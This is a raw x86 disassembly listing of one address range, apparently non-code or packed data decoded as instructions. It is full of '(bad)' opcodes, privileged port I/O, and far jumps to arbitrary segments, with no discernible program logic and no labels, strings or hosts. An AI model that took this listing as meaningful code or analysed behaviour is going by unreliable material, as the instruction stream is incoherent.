  418a80:	adc    bh,BYTE PTR [ecx+esi*8+0x3f29cf11]
  418a87:	add    ecx,edi
  418a89:	shr    edi,cl
  418a8b:	mov    ds:0xce62ba61,al
  418a90:	xchg   esi,eax
  418a91:	jge    0x418ab4
  418a93:	(bad)  [ebp-0x538b867f]
  418a99:	cld    
  418a9a:	bound  edx,QWORD PTR [eax-0x7f]
  418a9d:	imul   edx,ebx,0x1f4f4f36
  418aa3:	test   edi,edx
  418aa5:	jmp    0x8613fe65
  418aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aab:	fidiv  DWORD PTR [edx+0x7f3f882e]
  418ab1:	mov    DWORD PTR [edi-0x76],edx
  418ab4:	je     0x418ab6
	...
  418b16:	jl     0x418b2b
  418b18:	test   DWORD PTR [edx],esi
  418b1a:	out    dx,eax
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x2c0941ce
  418b23:	add    edi,DWORD PTR [eax-0x14]
  418b26:	push   edx
  418b27:	add    eax,DWORD PTR [ecx]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    ch,cl
  418b2f:	das    
  418b30:	sbb    ebx,DWORD PTR [edi-0x27]
  418b33:	ins    DWORD PTR es:[edi],dx
  418b34:	dec    ecx
  418b35:	stos   BYTE PTR es:[edi],al
  418b36:	cmp    bh,BYTE PTR [ebx-0x10b68bde]
  418b3c:	or     dh,BYTE PTR [edx+0x67]
  418b3f:	pop    ebx
  418b40:	adc    eax,0x9f432a0f
  418b45:	inc    edi
  418b46:	dec    ebp
  418b47:	mov    eax,ds:0xcf50bd8b
  418b4c:	test   BYTE PTR [esi-0x59],dl
  418b4f:	jno    0x418bb3
  418b51:	leave  
  418b52:	clc    
  418b53:	out    0x35,eax
  418b55:	lea    ebx,[ecx-0x48]
  418b58:	and    ch,bl
  418b5a:	xor    ch,bh
  418b5c:	jle    0x418ba3
  418b5e:	ficom  WORD PTR [edi]
  418b60:	xor    DWORD PTR [ebx+0x13],esi
  418b63:	mov    edx,0xaa35d0f3
  418b68:	(bad)  
  418b69:	cmp    BYTE PTR [ebx+0x2151afdd],dl
  418b6f:	iret   
  418b70:	pop    ss
  418b71:	int3   
  418b72:	jmp    0xd0e5dc90
  418b77:	jnp    0x418b1c
  418b79:	(bad)  
  418b7a:	shl    BYTE PTR [edi-0x432c93e9],1
  418b80:	inc    edi
  418b81:	sti    
  418b82:	dec    eax
  418b83:	jmp    0x418b74
  418b85:	inc    esp
  418b86:	dec    edi
  418b87:	adc    eax,0x1da5e642
  418b8c:	cmp    BYTE PTR [eax-0x12de67e3],dl
  418b92:	sub    al,0xf9
  418b94:	or     BYTE PTR [ebp-0x64],dl
  418b97:	pop    edx
  418b98:	and    dl,dl
  418b9a:	add    DWORD PTR [esi-0x3d],0xffffffac
  418b9e:	imul   eax
  418ba0:	aad    0x8
  418ba2:	add    al,0xc0
  418ba4:	add    eax,0x1efc5343
  418ba9:	or     ebp,DWORD PTR [eax-0x495ab309]
  418baf:	jl     0x418c21
  418bb1:	ret    
  418bb2:	and    eax,DWORD PTR [ebp+0x49]
  418bb5:	lahf   
  418bb6:	es out 0xf8,al
  418bb9:	xchg   ebx,eax
  418bba:	fst    QWORD PTR [esi]
  418bbc:	xor    al,0x96
  418bbe:	xor    al,0x7e
  418bc0:	stc    
  418bc1:	cwde   
  418bc2:	iret   
  418bc3:	fistp  QWORD PTR [ebp+0x18f4f13]
  418bc9:	xchg   esi,eax
  418bca:	in     eax,0x1e
  418bcc:	fs pop edi
  418bce:	pop    ss
  418bcf:	xchg   edx,eax
  418bd0:	mov    dl,0xcc
  418bd2:	xchg   esi,eax
  418bd3:	cli    
  418bd4:	add    eax,0x586ef22d
  418bd9:	mov    al,0xbc
  418bdb:	cdq    
  418bdc:	test   BYTE PTR [ebx-0x9ed01be],dl
  418be2:	ja     0x418b7c
  418be4:	mov    edx,0x5577ed57
  418be9:	push   0x5c
  418beb:	mov    bl,0x35
  418bed:	imul   bp,WORD PTR [eax+ebx*4+0x1c],0xfffd
  418bf3:	xchg   DWORD PTR ds:0x55b7b234,esi
  418bf9:	xchg   edx,eax
  418bfa:	inc    ebp
  418bfb:	lea    esp,[ebp-0x57]
  418bfe:	fs int 0xb5
  418c01:	enter  0x8b14,0x55
  418c05:	int3   
  418c06:	bound  esp,QWORD PTR [ebx]
  418c08:	xchg   ecx,eax
  418c09:	mov    edx,0x2e532dca
  418c0e:	ins    DWORD PTR es:[edi],dx
  418c0f:	iret   
  418c10:	out    dx,eax
  418c11:	mov    ebx,gs
  418c13:	inc    ebp
  418c14:	retf   
  418c15:	add    DWORD PTR [ebx],ebx
  418c17:	retf   
  418c18:	inc    ecx
  418c19:	xlat   BYTE PTR ds:[ebx]
  418c1a:	dec    eax
  418c1b:	lods   al,BYTE PTR ds:[esi]
  418c1c:	aad    0x3f
  418c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c1f:	or     eax,0xd44d1b5a
  418c24:	cmp    bh,BYTE PTR [ebx]
  418c26:	(bad)  
  418c27:	mov    ah,0x4c
  418c29:	in     eax,dx
  418c2a:	stos   DWORD PTR es:[edi],eax
  418c2b:	lahf   
  418c2c:	rep stos BYTE PTR es:[edi],al
  418c2e:	add    al,0xec
  418c30:	push   esp
  418c31:	rcl    ebx,cl
  418c33:	rcr    ch,cl
	...
  418c95:	add    bl,bh
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    eax,DWORD PTR [edx-0x1b]
  418ca4:	(bad)  
  418ca5:	call   0x107:0x10459
  418cac:	add    BYTE PTR [eax],al
  418cae:	jo     0x418c82
  418cb0:	inc    ebx
  418cb1:	sti    
  418cb2:	mov    dl,0x7e
  418cb4:	clc    
  418cb5:	shr    bh,cl
  418cb7:	or     DWORD PTR [esi-0x75],ebp
  418cba:	mov    ds:0x59686a51,eax
  418cbf:	repz mov dl,0xc2
  418cc2:	dec    edx
  418cc3:	jns    0x418c82
  418cc5:	clc    
  418cc6:	and    DWORD PTR [edx+edx*1-0x255e25d3],edx
  418ccd:	ja     0x418cf8
  418ccf:	push   cs
  418cd0:	pop    eax
  418cd1:	sub    eax,0xa81ad7c7
  418cd6:	xor    al,0x47
  418cd8:	cmp    DWORD PTR [ebp+ebx*1-0x1a],edi
  418cdc:	dec    ebx
  418cdd:	sub    ebp,DWORD PTR [ecx-0x80]
  418ce0:	fisubr WORD PTR ds:0x8bc14f17
  418ce6:	push   es
  418ce7:	iret   
  418ce8:	imul   esi,DWORD PTR [eax],0x9057059f
  418cee:	adc    al,0xc4
  418cf0:	sbb    eax,0x3eeaaedb
  418cf5:	jle    0x418d00
  418cf7:	int    0x5e
  418cf9:	push   ebx
  418cfa:	mov    eax,0x8393d5f5
  418cff:	fldenv [edx+esi*1-0x13]
  418d03:	mov    dh,0x80
  418d05:	add    eax,0xb584d697
  418d0a:	gs inc edx
  418d0c:	sti    
  418d0d:	mov    eax,0x56c135ba
  418d12:	pop    ds
  418d13:	(bad)  [ebx+0x50]
  418d16:	sbb    al,0xf6
  418d18:	jecxz  0x418d95
  418d1a:	pop    ebx
  418d1b:	ja     0x418cfb
  418d1d:	(bad)  
  418d1e:	gs dec eax
  418d20:	jmp    esp
  418d22:	scas   al,BYTE PTR es:[edi]
  418d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d24:	mov    al,ds:0x4245cf4
  418d29:	inc    edx
  418d2a:	icebp  
  418d2b:	call   0x2d7:0xdebc1a96
  418d32:	call   0x7325:0xe462a5f1
  418d39:	in     al,0x3e
  418d3b:	push   esp
  418d3c:	imul   ecx,DWORD PTR [ebx+0x497417f1],0x7
  418d43:	cmp    BYTE PTR [eax-0x5e329857],al
  418d49:	int    0x9a
  418d4b:	inc    esp
  418d4c:	mov    BYTE PTR [ecx-0xe],0xc1
  418d50:	sahf   
  418d51:	jnp    0x418dcd
  418d53:	and    BYTE PTR [ebx],ah
  418d55:	cmp    al,0x10
  418d57:	lods   eax,DWORD PTR ds:[esi]
  418d58:	add    al,0xe7
  418d5a:	mov    bl,0x2e
  418d5c:	out    0x97,al
  418d5e:	push   ecx
  418d5f:	clc    
  418d60:	sbb    BYTE PTR [ebp+0x5224e986],al
  418d66:	jecxz  0x418d10
  418d68:	ins    BYTE PTR es:[edi],dx
  418d69:	test   dl,0x54
  418d6c:	sub    BYTE PTR [ebp+0x40],dl
  418d6f:	pop    ebp
  418d70:	pop    ebp
  418d71:	adc    ebx,DWORD PTR [ebx+0x76b877aa]
  418d77:	popf   
  418d78:	mov    ecx,DWORD PTR [ebx+0x45]
  418d7b:	or     al,0xee
  418d7d:	pop    ebp
  418d7e:	test   eax,0xea593b69
  418d83:	ret    0x606d
  418d86:	sti    
  418d87:	jmp    0x418d6a
  418d89:	or     bh,BYTE PTR [esi+0x65ec6554]
  418d8f:	cmp    al,0x89
  418d91:	aaa    
  418d92:	jo     0x418d52
  418d94:	in     al,0xf1
  418d96:	mov    ebp,DWORD PTR [edi-0x5b7d986d]
  418d9c:	test   DWORD PTR [edx+0x109b0938],esi
  418da2:	push   ebp
  418da3:	call   0x3f91:0x71c9a7bd
  418daa:	mov    bh,0x7e
  418dac:	mov    ebx,0x1b93e774
  418db1:	(bad)  
  418db2:	retf   
  418db3:	and    eax,DWORD PTR [edi+0x0]
	...
  418e15:	add    BYTE PTR [esi],cl
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x6a0ae254
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	mov    ecx,fs
  418e30:	cld    
  418e31:	sbb    BYTE PTR [ebx],al
  418e33:	xchg   ebx,eax
  418e34:	call   0x36cc:0x9c9c01a3
  418e3b:	cld    
  418e3c:	ret    0x48b2
  418e3f:	pop    ecx
  418e40:	cdq    
  418e41:	pop    edx
  418e42:	lds    esp,FWORD PTR [edi+0x9]
  418e45:	pop    ss
  418e46:	(bad)  
  418e47:	fmul   QWORD PTR [edi+0x5e]
  418e4a:	cmp    edi,DWORD PTR [ebx]
  418e4c:	jbe    0x418e21
  418e4e:	mov    eax,ds:0xf7ef1d64
  418e53:	or     esi,DWORD PTR [edx-0x70a38b0c]
  418e59:	cmp    edi,esp
  418e5b:	data16 hlt 
  418e5d:	inc    edi
  418e5e:	js     0x418e3f
  418e60:	sar    DWORD PTR [eax],1
  418e62:	test   BYTE PTR [esi+0x6c],ah
  418e65:	mul    ebx
  418e67:	sub    edx,DWORD PTR [edi]
  418e69:	sub    DWORD PTR [esi-0x6a],edi
  418e6c:	cmp    DWORD PTR [ebx-0x20],eax
  418e6f:	or     BYTE PTR [ebp-0x2df4b9fc],bh
  418e75:	cmp    eax,0x10d9e951
  418e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e7b:	aaa    
  418e7c:	sar    DWORD PTR [eax],1
  418e7e:	push   es
  418e7f:	rol    DWORD PTR [esi-0x438fabe8],cl
  418e85:	and    BYTE PTR [ebp+0x6c],0xba
  418e89:	jp     0x418efb
  418e8b:	mov    ch,0xdb
  418e8d:	jmp    0x12fcfffc
  418e92:	xchg   esi,eax
  418e93:	mov    eax,ds:0x1745fc5b
  418e98:	loopne 0x418eef
  418e9a:	jle    0x418e99
  418e9c:	xor    BYTE PTR [esi-0x56718c95],dl
  418ea2:	dec    ecx
  418ea3:	mov    dl,0xb3
  418ea5:	or     al,0x6a
  418ea7:	mov    cl,0x96
  418ea9:	sar    BYTE PTR [eax+0x0],0x89
  418ead:	out    0x64,eax
  418eaf:	nop
  418eb0:	or     eax,0xeb57409
  418eb5:	aam    0x85
  418eb7:	mov    eax,DWORD PTR [ebx+0x2f21b8e3]
  418ebd:	rdpmc  
  418ebf:	rcr    ah,1
  418ec1:	mov    bh,0xd4
  418ec3:	pop    edi
  418ec4:	pop    edi
  418ec5:	push   esi
  418ec6:	lods   eax,DWORD PTR ds:[esi]
  418ec7:	dec    ebp
  418ec8:	fdivr  DWORD PTR [edi]
  418eca:	push   eax
  418ecb:	repz int 0xc3
  418ece:	cdq    
  418ecf:	mov    dh,0x5e
  418ed1:	adc    DWORD PTR [esi],ebp
  418ed3:	fucomp st(0)
  418ed5:	rcr    DWORD PTR [ebx+edx*8],1
  418ed8:	xchg   edx,eax
  418ed9:	icebp  
  418eda:	xchg   ebp,eax
  418edb:	sub    BYTE PTR ds:0xa9bca6e1,0x9
  418ee2:	jg     0x418ebc
  418ee4:	jge    0x418e77
  418ee6:	push   eax
  418ee7:	sub    BYTE PTR [ebx-0x6ef26413],cl
  418eed:	test   al,0xef
  418eef:	data16 std 
  418ef1:	(bad)  [ecx]
  418ef3:	jle    0x418f61
  418ef5:	icebp  
  418ef6:	scas   al,BYTE PTR es:[edi]
  418ef7:	adc    al,ch
  418ef9:	into   
  418efa:	loope  0x418f6f
  418efc:	or     DWORD PTR [edx-0x6aae33f1],ebx
  418f02:	adc    eax,0x4cf8a7d3
  418f07:	xor    ah,BYTE PTR ds:0x2a5b70a7
  418f0d:	inc    edi
  418f0e:	stc    
  418f0f:	addr16 adc al,0x11
  418f12:	jle    0x418f82
  418f14:	mov    edx,0x40aea12a
  418f19:	out    dx,al
  418f1a:	and    al,0x29
  418f1c:	dec    esi
  418f1d:	scas   eax,DWORD PTR es:[edi]
  418f1e:	lock adc edi,ecx
  418f21:	ror    dh,1
  418f23:	fldenv [eax+0x6681483f]
  418f29:	rcl    DWORD PTR [eax+0xd14f4a9],1
  418f2f:	xchg   edx,eax
  418f30:	cld    
  418f31:	sbb    DWORD PTR [edx+0x192b],0x0
	...
  418f94:	add    BYTE PTR [eax],al
  418f96:	sbb    al,0x97
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp+0x547adcb2]
  418fa3:	outs   dx,BYTE PTR ds:[esi]
  418fa4:	dec    edi
  418fa5:	stos   BYTE PTR es:[edi],al
  418fa6:	addr16 push es
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [eax-0x47],ah
  418fb0:	ja     0x418ff4
  418fb2:	dec    bh
  418fb4:	lods   al,BYTE PTR ds:[esi]
  418fb5:	fnsave [eax]
  418fb7:	lods   eax,DWORD PTR ds:[esi]
  418fb8:	xchg   ebp,eax
  418fb9:	call   0x1367:0xaa0fb4f6
  418fc0:	ss dec edx
  418fc2:	xor    BYTE PTR [edi+0x4f],0xe0
  418fc6:	ins    DWORD PTR es:[edi],dx
  418fc7:	and    bh,BYTE PTR [si-0x4d]
  418fcb:	or     al,0xea
  418fcd:	test   eax,0xb0be6310
  418fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fd3:	mov    dl,0x35
  418fd5:	test   eax,0x4592f734
  418fda:	push   es
  418fdb:	and    ecx,DWORD PTR [edx+0x76]
  418fde:	xchg   edi,eax
  418fdf:	pop    ebx
  418fe0:	sub    esi,DWORD PTR [eax+0x630c062d]
  418fe6:	ins    DWORD PTR es:[edi],dx
  418fe7:	test   al,cl
  418fe9:	sar    BYTE PTR [edx],cl
  418feb:	inc    edx
  418fec:	div    DWORD PTR [esi-0x51751b8]
  418ff2:	cli    
  418ff3:	ret    
  418ff4:	std    
  418ff5:	xor    al,0xd0
  418ff7:	push   esi
  418ff8:	(bad)  
  418ff9:	cmp    esp,DWORD PTR [eax+0x2f]
  418ffc:	and    ch,BYTE PTR [ebx]
  418ffe:	mov    cl,0x64
  419000:	inc    edi
  419001:	icebp  
  419002:	jo     0x41905b
  419004:	mov    al,0x3d
  419006:	sahf   
  419007:	dec    edi
  419008:	fimul  WORD PTR [esi+0x36]
  41900b:	mov    bh,0x0
  41900d:	xor    ch,BYTE PTR [eax+esi*4-0x115eca64]
  419014:	out    dx,al
  419015:	mov    ecx,esi
  419017:	fadd   DWORD PTR [bp+di+0x7063]
  41901c:	and    al,0x53
  41901e:	jno    0x41907d
  419020:	lds    eax,FWORD PTR [ebx-0x534644a4]
  419026:	std    
  419027:	std    
  419028:	outs   dx,BYTE PTR ds:[esi]
  419029:	sbb    BYTE PTR [ebx+esi*4+0x30],cl
  41902d:	mov    ebx,0x8d7d5fd7
  419032:	mov    ds:0x80f283d4,al
  419037:	push   edx
  419038:	cli    
  419039:	add    DWORD PTR [eax+edi*8+0x6d],edi
  41903d:	inc    BYTE PTR [edi-0x51]
  419040:	rcr    BYTE PTR [edx-0x7855497e],0x5c
  419047:	psrld  mm5,QWORD PTR [edi-0x67]
  41904b:	xor    edx,DWORD PTR [edi+esi*8+0x49]
  41904f:	pop    ecx
  419050:	ds mov eax,0xe6a88b67
  419056:	push   eax
  419057:	mov    DWORD PTR [edi+0x7c55811e],ecx
  41905d:	retf   
  41905e:	adc    al,0xf4
  419060:	aam    0x75
  419062:	mov    BYTE PTR [ebp-0x6e474e8e],ah
  419068:	mov    dl,0xbf
  41906a:	ss cmc 
  41906c:	inc    ecx
  41906d:	or     al,0x99
  41906f:	or     al,0x9d
  419071:	pop    es
  419072:	push   ds
  419073:	push   ds
  419074:	cwde   
  419075:	imul   eax,DWORD PTR [esi+0x44],0x8667180b
  41907c:	cs mov ecx,0x9cbb8e45
  419082:	daa    
  419083:	xor    al,0xbd
  419085:	into   
  419086:	fist   DWORD PTR [ebx-0x52]
  419089:	xor    al,BYTE PTR [esi+0x77]
  41908c:	test   BYTE PTR [edi+0x673cb57b],ch
  419092:	sbb    eax,0x76df11a5
  419097:	(bad)  
  419099:	mov    dh,0x24
  41909b:	xchg   DWORD PTR es:[esi+edi*4-0x20],ebx
  4190a0:	lds    edx,FWORD PTR [ebx-0x30]
  4190a3:	cdq    
  4190a4:	mov    ecx,0xd376aa6d
  4190a9:	sub    esp,DWORD PTR [edx+eax*1-0x6f]
  4190ad:	loopne 0x41904f
  4190af:	lock cmp bh,BYTE PTR ds:0x34892
	...
  419116:	scas   eax,DWORD PTR es:[edi]
  419117:	test   DWORD PTR [esi-0xa441be],ebx
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    edi,esi
  419123:	sbb    al,0x44
  419125:	mov    esp,0x1076e
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    BYTE PTR [ecx],dh
  41912f:	inc    cx
  419131:	push   edx
  419132:	mov    edi,0xa4df165e
  419137:	dec    eax
  419138:	rol    BYTE PTR [eax+0x4e],0x49
  41913c:	xchg   esi,eax
  41913d:	mov    ebp,0xf8b8c77f
  419142:	mov    es,WORD PTR [ebx-0x35]
  419145:	repz fstp TBYTE PTR es:[ecx+0x2fc35304]
  41914d:	xchg   esi,eax
  41914e:	inc    eax
  41914f:	cmp    esi,edx
  419151:	fild   WORD PTR [ecx]
  419153:	dec    ebp
  419154:	xor    eax,0xaa086a13
  419159:	fnstenv [edi+0x19]
  41915c:	sub    eax,0x4ef571e2
  419161:	inc    esi
  419162:	in     eax,0x27
  419164:	scas   al,BYTE PTR es:[edi]
  419165:	add    al,0x41
  419167:	xor    eax,DWORD PTR [ecx-0x49f605a5]
  41916d:	popa   
  41916e:	xchg   BYTE PTR [ebp-0x62],cl
  419171:	fst    st(5)
  419173:	lods   al,BYTE PTR ds:[esi]
  419174:	sbb    eax,0x274f6129
  419179:	or     DWORD PTR ds:0x6d22f403,eax
  41917f:	lea    esp,[eax+0x4338ec90]
  419185:	js     0x419125
  419187:	sbb    eax,0x386f9dee
  41918c:	sbb    al,0x19
  41918e:	call   0xd2b7:0x9a26f5f
  419195:	dec    esi
  419196:	jmp    0x4191e9
  419198:	mov    ds:0x6fb7c0e8,al
  41919d:	pop    esp
  41919e:	xor    eax,0xd1b6297a
  4191a3:	mov    eax,DWORD PTR [edi-0x194dbc53]
  4191a9:	cmp    DWORD PTR [ecx],ebp
  4191ab:	call   0x3741239f
  4191b0:	and    esp,DWORD PTR [edi]
  4191b2:	or     cl,BYTE PTR [ecx+eax*2]
  4191b5:	push   ss
  4191b6:	mov    edx,0x5e7a7592
  4191bb:	lds    ecx,FWORD PTR [esi]
  4191bd:	lods   al,BYTE PTR ds:[esi]
  4191be:	arpl   WORD PTR [ecx],bp
  4191c0:	and    al,0x93
  4191c3:	int    0x2b
  4191c5:	or     DWORD PTR [ebx+0x3280425e],ebp
  4191cb:	xchg   edx,edx
  4191cd:	(bad)  
  4191ce:	rol    bl,cl
  4191d0:	mov    bh,0x53
  4191d2:	fwait
  4191d3:	jecxz  0x41921d
  4191d5:	cmp    DWORD PTR ds:0xafacdaf3,0xffffff93
  4191dc:	iret   
  4191dd:	sbb    al,0x97
  4191df:	ja     0x4191ad
  4191e1:	mov    bl,0x92
  4191e3:	sbb    ah,al
  4191e5:	or     al,0xee
  4191e7:	pop    esp
  4191e8:	stos   DWORD PTR es:[edi],eax
  4191e9:	xor    al,0x52
  4191eb:	imul   esp,edi,0x1101adb3
  4191f1:	test   al,0x5
  4191f3:	loop   0x419175
  4191f5:	in     al,dx
  4191f6:	mov    bl,0x10
  4191f8:	adc    esi,0x35688264
  4191fe:	test   BYTE PTR [edi+0x58cb827],dl
  419204:	stos   DWORD PTR es:[edi],eax
  419205:	jmp    0x66f0:0x77ba9bb1
  41920c:	imul   esi,esi,0xd669a80e
  419212:	bnd jae 0x419247
  419215:	xchg   edx,eax
  419216:	(bad)
  419219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921a:	adc    ebx,DWORD PTR [edx]
  41921c:	sbb    BYTE PTR [edi+ecx*1],ah
  41921f:	pop    ss
  419220:	or     DWORD PTR [ecx-0x563a7a64],ebp
  419226:	inc    ecx
  419227:	shl    DWORD PTR [ebx],cl
  419229:	out    dx,al
  41922a:	or     al,0x27
  41922c:	or     eax,0xeb40815c
  419231:	imul   ebx,DWORD PTR [ebx+0x8a9d],0x0
	...
  419293:	add    BYTE PTR [eax],al
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0xea0c0f4f
  4192a5:	dec    ecx
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [eax],ch
  4192af:	iret   
  4192b0:	jns    0x419257
  4192b2:	push   esp
  4192b3:	stos   DWORD PTR es:[edi],eax
  4192b4:	daa    
  4192b5:	out    0x9d,eax
  4192b7:	pop    es
  4192b8:	mov    dl,0xaf
  4192ba:	jmp    0x2eeb:0x3e2cc48a
  4192c1:	pushf  
  4192c2:	pop    esp
  4192c3:	(bad)  
  4192c4:	fiadd  DWORD PTR [eax]
  4192c6:	xchg   edx,eax
  4192c7:	mov    WORD PTR [edx],ss
  4192c9:	test   BYTE PTR [edi-0x54],dh
  4192cc:	push   ecx
  4192cd:	int3   
  4192ce:	adc    eax,0x58ec326b
  4192d3:	jbe    0x41934d
  4192d5:	inc    edx
  4192d6:	or     ebp,ecx
  4192d8:	(bad)  
  4192d9:	lods   eax,DWORD PTR ds:[esi]
  4192da:	xchg   esp,eax
  4192db:	pop    edi
  4192dc:	or     bl,0x5
  4192df:	scas   al,BYTE PTR es:[edi]
  4192e0:	and    al,0xf6
  4192e2:	pop    ecx
  4192e3:	jmp    0x7bf4b4b6
  4192e8:	cdq    
  4192e9:	leave  
  4192ea:	test   eax,0x7859c4fa
  4192ef:	out    0x16,al
  4192f1:	pop    edx
  4192f2:	mov    bl,0xba
  4192f4:	inc    eax
  4192f5:	bound  ebp,QWORD PTR [ebx-0x7b]
  4192f8:	rcl    DWORD PTR [esi+0x474a9086],1
  4192fe:	icebp  
  4192ff:	cmp    esi,DWORD PTR [edx+ebp*4-0x62]
  419303:	or     al,0xaa
  419305:	in     eax,dx
  419306:	mov    ebx,0x9c5b0c5a
  41930b:	mov    bl,0x94
  41930d:	add    eax,0xa2bd49cd
  419312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419313:	xor    esi,DWORD PTR [ecx]
  419315:	mov    BYTE PTR [ecx+0x580972ae],dl
  41931b:	aad    0x2e
  41931d:	in     al,0x2c
  41931f:	dec    ebp
  419320:	push   eax
  419321:	out    dx,al
  419322:	outs   dx,DWORD PTR ds:[esi]
  419323:	adc    DWORD PTR ds:0x3e90fc6d,edi
  419329:	xor    al,BYTE PTR [ebx+0x51]
  41932c:	sahf   
  41932d:	gs call 0x5cb4:0x876778de
  419335:	(bad)  
  419336:	pavgb  mm7,QWORD PTR [esi+0x4b]
  41933a:	push   eax
  41933b:	cld    
  41933c:	jge    0x419357
  41933e:	scas   eax,DWORD PTR es:[edi]
  41933f:	aaa    
  419340:	mov    ecx,DWORD PTR [ebp-0x7d]
  419343:	cmc    
  419344:	push   esp
  419345:	das    
  419346:	cld    
  419347:	push   cs
  419348:	retf   0x9362
  41934b:	sub    esi,eax
  41934d:	sub    esi,ecx
  41934f:	sub    ah,BYTE PTR [edi-0x6a458d7]
  419355:	mov    dl,0xe3
  419357:	ja     0x419387
  419359:	pop    edx
  41935a:	push   0x50
  41935c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41935d:	lods   al,BYTE PTR ds:[esi]
  41935e:	add    ah,BYTE PTR [edi]
  419360:	dec    DWORD PTR [eax+0x4874d1f4]
  419366:	mov    cl,0x36
  419368:	pcmpeqd mm1,mm1
  41936b:	fnstcw WORD PTR [esi-0x382726b8]
  419371:	sbb    BYTE PTR [eax-0x49bc61fb],cl
  419377:	adc    ah,BYTE PTR [edi+edx*4-0x1b]
  41937b:	push   es
  41937c:	and    edx,ecx
  41937e:	mov    dh,BYTE PTR [edx]
  419380:	pop    ds
  419381:	aad    0x20
  419383:	jae    0x4193f8
  419385:	sbb    DWORD PTR [edx+0x339041ac],edi
  41938b:	jmp    0xf5fa6f13
  419390:	mov    bl,0x42
  419392:	in     eax,0xcd
  419394:	not    esi
  419396:	jno    0x419393
  419398:	jae    0x4193c1
  41939a:	fbld   TBYTE PTR [ecx+0x1de68e8]
  4193a0:	(bad)  
  4193a1:	(bad)  
  4193a2:	push   ds
  4193a3:	push   ds
  4193a4:	je     0x419377
  4193a6:	or     eax,0x458525a9
  4193ab:	or     ah,ah
  4193ad:	mov    DWORD PTR ds:0xc245bb1d,ebx
  4193b3:	cs jnp 0x4193b6
	...
  419416:	cmp    eax,0xed3a6998
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8+0x60406337]
  419425:	mov    cl,0x7c
  419427:	or     DWORD PTR [ecx],eax
  419429:	add    BYTE PTR [edi],al
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    BYTE PTR [ecx+0x16],ah
  419430:	sbb    al,al
  419432:	(bad)  
  419433:	jae    0x419465
  419435:	mov    esp,0x630fdd22
  41943a:	outs   dx,DWORD PTR ds:[esi]
  41943b:	ror    BYTE PTR [ecx+eax*8+0x6d],0xb8
  419440:	in     eax,dx
  419441:	leave  
  419442:	or     eax,0xf3726ca9
  419447:	arpl   cx,si
  419449:	mov    dh,0xc2
  41944b:	(bad)
  41944e:	sbb    bl,ch
  419450:	hlt    
  419451:	cmp    dh,0x4f
  419454:	ss mov ecx,0xc0e3c4c9
  41945a:	jno    0x419469
  41945c:	clc    
  41945d:	in     eax,dx
  41945e:	add    ecx,DWORD PTR [edi+0x27]
  419461:	jecxz  0x4193f5
  419463:	fsub   st(7),st
  419465:	pop    eax
  419466:	sub    bl,BYTE PTR [ebp-0x4c2f5f41]
  41946c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41946d:	inc    eax
  41946e:	dec    eax
  41946f:	add    ah,BYTE PTR [eax-0x2]
  419472:	shl    BYTE PTR [ebp-0x5a],0xa4
  419476:	shr    BYTE PTR [edi+0x1],0x56
  41947a:	cwde   
  41947b:	add    eax,0x47c8bc87
  419480:	push   ss
  419481:	call   0x1234f21f
  419486:	push   edi
  419487:	and    DWORD PTR [edi],esp
  419489:	fmul   DWORD PTR [ebx-0x21ea1a90]
  41948f:	xchg   BYTE PTR [ecx],dh
  419491:	dec    esi
  419492:	sbb    esp,edx
  419494:	ficom  DWORD PTR [edx+0x59]
  419497:	aas    
  419498:	or     eax,0x8940171
  41949d:	mov    ch,0x53
  41949f:	aas    
  4194a0:	or     eax,0x13e02e26
  4194a5:	add    esi,DWORD PTR [ebx-0x74]
  4194a8:	retf   0x46c8
  4194ab:	pushf  
  4194ac:	mov    al,ds:0x271c32ee
  4194b1:	add    ch,BYTE PTR [ecx-0x7a]
  4194b4:	sub    eax,0x8193d464
  4194b9:	fisub  DWORD PTR [edi]
  4194bb:	repz (bad) 
  4194be:	dec    esi
  4194bf:	xchg   ebp,eax
  4194c0:	aaa    
  4194c1:	popf   
  4194c2:	adc    bh,dh
  4194c4:	push   ebx
  4194c5:	aaa    
  4194c6:	add    eax,0xe73d126d
  4194cb:	sub    eax,0x2e5e936c
  4194d0:	add    cl,dh
  4194d2:	cdq    
  4194d3:	add    ecx,DWORD PTR [ecx+ecx*1+0x1f6dfcab]
  4194da:	and    al,0x76
  4194dc:	mov    WORD PTR [ebp-0x58e9deb8],ss
  4194e2:	sbb    BYTE PTR [edx+esi*1-0xc663ddc],0x41
  4194ea:	popf   
  4194eb:	mov    ebp,0x6f203811
